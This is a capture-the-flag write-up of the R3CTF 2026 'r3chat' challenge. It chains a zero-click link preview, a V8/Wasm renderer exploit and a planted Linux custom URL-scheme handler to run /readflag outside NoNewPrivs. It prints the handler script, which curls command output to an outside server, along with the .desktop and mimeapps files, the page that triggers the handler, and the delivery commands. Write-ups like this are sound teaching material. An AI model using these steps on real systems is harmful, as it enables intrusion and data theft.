# r3chat writeup

**Challenge:** r3chat  
**Event:** R3CTF 2026  
**Category:** Electron / client-side  
**Final dynamic flag from the rerun:**

```text
r3ctf{TRusteD_p4rtN3Rs_6R3@k-HEaRt5_@nD-S4nd6OxeS_WItH0ut_a_single_click0}
```

## The short version

The challenge is a chat app built with Electron. There is a bot user called **SexyGirl**. If we DM the bot a link, the bot automatically loads that link in a hidden browser preview.

That hidden preview gave us JavaScript execution inside the bot's Electron renderer process. From there we used a V8/Wasm exploit to get native command execution in the renderer. Directly running `/readflag` did **not** work, because the renderer had Linux `NoNewPrivs` enabled, which stops setuid binaries from becoming root.

So the trick was:

1. Use renderer RCE to write files into `/home/bot`.
2. Register our own Linux custom URL scheme handler, `rpwn://`.
3. Send the bot a second link whose page navigates to `rpwn://...`.
4. Electron's **main process** asks `xdg-open` to handle that custom scheme.
5. `xdg-open` runs our `.desktop` handler outside the sandbox / without `NoNewPrivs`.
6. Our handler runs `/readflag` and curls the flag back to us.

In simple terms: the browser part could not read the flag, but it could set a trap. Then we made the desktop part of Electron step on the trap.

---

## What the challenge gives us

The attachment contained a packaged Electron application. Electron apps have two important pieces:

- the **main process**, which is like the app controller and has desktop privileges;
- the **renderer process**, which is basically Chromium showing web pages.

The flag is protected in the usual CTF style:

- `/flag` is only readable by root;
- `/readflag` is a small setuid-root helper that prints `/flag`.

So the goal is not just "run a command". The goal is specifically to run `/readflag` in a context where setuid still works.

The remote challenge is a chat server plus a bot. On the new dynamic instance we used:

```text
challenge.ctf2026.r3kapig.com:32538
```

To talk to the chat server, I reused the app's own client code under Electron's Node mode:

```bash
PORT=32538 \
ELECTRON_RUN_AS_NODE=1 \
extract/deb/opt/R3Chat/r3chat-client \
/tmp/r3_send_online_port.js "https://our-payload-url/"
```

That script registers a fresh user, finds the online SexyGirl bot, and DMs it our link.

---

## Important behavior: the bot auto-previews links

The bot scans incoming DMs for URLs. If the message contains something like:

```text
hi https://attacker.example/payload
```

then the bot loads that URL inside a hidden Electron `<webview>` as a link preview.

This is the whole delivery mechanism. We do not need the bot user to click anything. The challenge is effectively zero-click: send a DM, the bot previews it, our JavaScript runs.

---

## Hosting the payload

The exploit page needed `SharedArrayBuffer`, so the page had to be cross-origin isolated. My tiny Python server added these headers:

```http
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin
Cache-Control: no-store
```

I served the payload locally on port `18080` and exposed it with Cloudflare Tunnel:

```text
https://reaches-excluded-project-manual.trycloudflare.com/
```

The server also logged every GET/POST so I could see when the bot loaded a stage or posted the flag back.

---

## Stage 1: getting native code execution in the renderer

The renderer is Chromium/Electron:

```text
Electron 33.4.11
Chrome   130.0.6723.191
V8       13.x
```

The payload used a V8/Wasm bug chain. I will avoid dumping the giant Wasm byte arrays here, but conceptually it did this:

1. Race `WebAssembly.compileStreaming()` using a `SharedArrayBuffer`.
2. Build an addrof/read/write primitive.
3. Leak a pointer inside the Electron binary.
4. Compute the Electron PIE base.
5. Patch a Wasm function dispatch target.
6. Use a small ROP call to execute:

```bash
/bin/sh -c '<our command>'
```

A successful remote run logged values like this:

```text
leak[0]=0x57e2a73f9080 pie=0x57e2a3786000
rop data=0xcbf0007ba28 cmdlen=1547 argv=0xcbf0007c328
go
```

That proved the browser preview page had become command execution as the bot user.

At this point it is tempting to just run:

```bash
/readflag
```

But that failed.

---

## Why direct `/readflag` failed

The renderer process had this in `/proc/<pid>/status`:

```text
NoNewPrivs: 1
```

`NoNewPrivs` is a Linux safety switch. Once it is enabled, a child process is not allowed to gain extra privileges. That means a setuid-root binary like `/readflag` no longer becomes root when launched from the renderer.

The result was:

```text
uid=1001(bot) gid=1001(bot) groups=1001(bot)
NoNewPrivs: 1
open /flag: Permission denied
```

So renderer RCE alone was not enough.

But the Electron main process had:

```text
NoNewPrivs: 0
```

That was the opening. We needed the main process, or something spawned by it, to run our command.

---

## Stage 1 continued: planting a custom URL handler

Linux desktop apps use `.desktop` files and `xdg-open` to decide what program opens a URL scheme.

For example, if the system sees:

```text
mailto:someone@example.com
```

it opens the configured mail client. We can make our own scheme too, such as:

```text
rpwn://anything
```

The files we planted were:

```text
/home/bot/.local/bin/rpwn.sh
/home/bot/.local/share/applications/rpwn-preview.desktop
/home/bot/.config/mimeapps.list
/home/bot/.local/share/applications/mimeapps.list
```

The script was basically:

```sh
#!/bin/sh
{
  echo RPWN_RUN url="$1"
  /usr/bin/id
  /usr/bin/grep NoNewPrivs /proc/$$/status 2>/dev/null || true
  /readflag 2>&1
} | /usr/bin/curl -sS -m 10 --data-binary @- https://our-server/flag
```

The `.desktop` file registered that script as a handler:

```ini
[Desktop Entry]
Type=Application
Name=preview
NoDisplay=true
Exec=/bin/sh /home/bot/.local/bin/rpwn.sh %u
MimeType=x-scheme-handler/rpwn;
```

And `mimeapps.list` made it the default handler:

```ini
[Default Applications]
x-scheme-handler/rpwn=rpwn-preview.desktop
```

The stage 1 command also ran:

```bash
xdg-mime default rpwn-preview.desktop x-scheme-handler/rpwn
```

so `xdg-open rpwn://...` would know what to execute.

### Tiny but painful detail: use `rpwn://`, not `r3pwn://`

I first tried the scheme name `r3pwn://`. That looked fine to me, but `xdg-open` did not treat it as a URL scheme because its shell regex expects the scheme to start with letters and then continue in a POSIX-character way.

The error was:

```text
xdg-open: file 'r3pwn://diag' does not exist
```

Switching to `rpwn://` fixed it immediately.

This was one of those silly details that cost real time.

---

## Self-test after planting

The plant stage did a self-test from the renderer:

```text
RPWN_RUN url=rpwn://selftest
uid=1001(bot) gid=1001(bot) groups=1001(bot)
NoNewPrivs: 1
open /flag: Permission denied
```

At first glance that looks bad, but it was actually useful.

It proved:

- the URL handler was installed correctly;
- `xdg-open rpwn://selftest` found our `.desktop` file;
- our script executed;
- the only remaining issue was that this self-test was still launched from the renderer's `NoNewPrivs: 1` environment.

So the next stage had to make Electron itself handle the custom URL, not our renderer shell.

---

## Stage 2: make Electron main call `xdg-open`

The second page was much smaller. It just tried several ways to navigate the hidden webview to `rpwn://...` repeatedly:

```html
<script>
function go(i) {
  const u = 'rpwn://go/' + Date.now() + '/' + i;

  try { location.href = u; } catch(e) {}

  try {
    let a = document.createElement('a');
    a.href = u + 'a';
    document.body.appendChild(a);
    a.click();
  } catch(e) {}

  try {
    let f = document.createElement('iframe');
    f.src = u + 'f';
    f.style.display = 'none';
    document.body.appendChild(f);
  } catch(e) {}
}

for (let i = 0; i < 10; i++) setTimeout(() => go(i), i * 100);
setInterval(() => go('iv'), 1000);
</script>
```

We sent this stage as another DM:

```bash
PORT=32538 \
ELECTRON_RUN_AS_NODE=1 \
extract/deb/opt/R3Chat/r3chat-client \
/tmp/r3_send_online_port.js \
"https://reaches-excluded-project-manual.trycloudflare.com/stage2.html?rpwnstage_new=$(date +%s%N)"
```

When Chromium inside Electron hits an unknown external protocol, Electron asks the desktop to open it. On Linux, that goes through `xdg-open`. This time the process chain came from the Electron app/main side, where `NoNewPrivs` was not set.

The callback looked like this:

```text
RPWN_RUN url=rpwn://go/1783259100304/iv
uid=1001(bot) gid=1001(bot) groups=1001(bot)
NoNewPrivs: 0
r3ctf{TRusteD_p4rtN3Rs_6R3@k-HEaRt5_@nD-S4nd6OxeS_WItH0ut_a_single_click0}
```

That is the win condition: same bot user, but `NoNewPrivs: 0`, so `/readflag` successfully becomes root and prints the flag.

---

## Full attack flow

Here is the full chain in one picture:

```text
Attacker DM
   |
   v
SexyGirl bot auto-loads link in hidden webview
   |
   v
Stage 1 JavaScript runs in renderer
   |
   v
V8/Wasm exploit gives renderer command execution
   |
   v
Renderer writes rpwn:// xdg-open handler into /home/bot
   |
   v
Attacker sends Stage 2 link
   |
   v
Stage 2 navigates to rpwn://go/...
   |
   v
Electron main / desktop integration calls xdg-open
   |
   v
xdg-open launches our .desktop Exec line
   |
   v
/home/bot/.local/bin/rpwn.sh runs with NoNewPrivs=0
   |
   v
/readflag works
   |
   v
Flag is POSTed back to our server
```

---

## Commands used for the successful rerun

Plant the handler on the fresh dynamic instance:

```bash
PORT=32538 \
ELECTRON_RUN_AS_NODE=1 \
extract/deb/opt/R3Chat/r3chat-client \
/tmp/r3_send_online_port.js \
"https://reaches-excluded-project-manual.trycloudflare.com/?rpwnplant_new=$(date +%s%N)"
```

Trigger the handler from Electron main:

```bash
PORT=32538 \
ELECTRON_RUN_AS_NODE=1 \
extract/deb/opt/R3Chat/r3chat-client \
/tmp/r3_send_online_port.js \
"https://reaches-excluded-project-manual.trycloudflare.com/stage2.html?rpwnstage_new=$(date +%s%N)"
```

Check the logs:

```bash
grep -a -o 'r3ctf{[^}]*}' /tmp/r3serve/server.log | tail
```

---

## What made this challenge tricky

### 1. Renderer RCE was not equal to flag

Normally in CTFs, once you get command execution as the bot user, you are done. Here that was false because `/readflag` depends on setuid root, and the renderer had `NoNewPrivs` enabled.

The important question was not only "can I run commands?" but also "what privilege context do those commands inherit?"

### 2. Electron has multiple security boundaries

This app had at least three different layers that mattered:

- Chromium renderer sandbox-ish behavior;
- Linux `NoNewPrivs`;
- Electron main process desktop integration.

The final exploit worked by moving sideways from the renderer into normal desktop URL handling.

### 3. `xdg-open` behavior is weird

The desktop handler path is very Linux-y:

- `.desktop` files;
- MIME scheme handlers;
- `mimeapps.list`;
- `DISPLAY` / X11 assumptions;
- shell regexes for what counts as a URL scheme.

The scheme-name bug with `r3pwn://` versus `rpwn://` was a good reminder to test the boring glue code carefully.

---

## Takeaways

- Auto-preview bots are dangerous because they turn links into code execution surfaces.
- In Electron challenges, always separate renderer process behavior from main process behavior.
- `NoNewPrivs` can make setuid helpers fail even after command execution.
- Linux desktop integration can be an escape hatch: custom URL handlers are just files in the user's home directory.
- If a weird string like `r3pwn://` fails, test whether the tool even thinks it is a URL.

Final flag from the live rerun:

```text
r3ctf{TRusteD_p4rtN3Rs_6R3@k-HEaRt5_@nD-S4nd6OxeS_WItH0ut_a_single_click0}
```
